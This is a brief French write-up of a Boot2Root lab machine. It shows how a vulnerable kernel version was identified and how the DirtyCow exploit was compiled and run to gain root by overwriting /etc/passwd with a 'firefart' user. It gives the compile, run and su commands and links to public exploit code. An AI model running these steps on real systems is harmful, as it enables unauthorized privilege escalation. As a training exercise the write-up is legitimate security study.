# Boot2Root -- VacheQuiPue

On recommence à partir de l'étape `Step 5 - Sanitize`

## Step 5 - Identification
Une fois sur le serveur, on cherche des potentielles manières de passer root.
Après un peu de recherche et de tests, on constate que le kernel est vulnérable à l'exploit DirtyCow
```
> uname -ra
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```
La faille existe sur les Linux Kernel <= 3.19.0-73.8

## Step 6 - VacheQuiPue
On copie le code trouvable dans `scripts/dirty.c`, On le compile puis on le lance 
```
gcc -pthread dirty.c -o dirty -lcrypt
./dirty cpt
```

On attend un peu, on se connecte en tant que `firefart`, on restore le passwd d'origine et on se connecte en tant que root
```
su firefart
mdp: cpt
mv /tmp/passwd.bak /etc/passwd
su root
```

Et hop, root.


## Sources:
References élevation de privilèges: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
Exploit DirtyCow: https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
Explication DirtyCow: https://github.com/thaddeuspearson/Understanding_DirtyCOW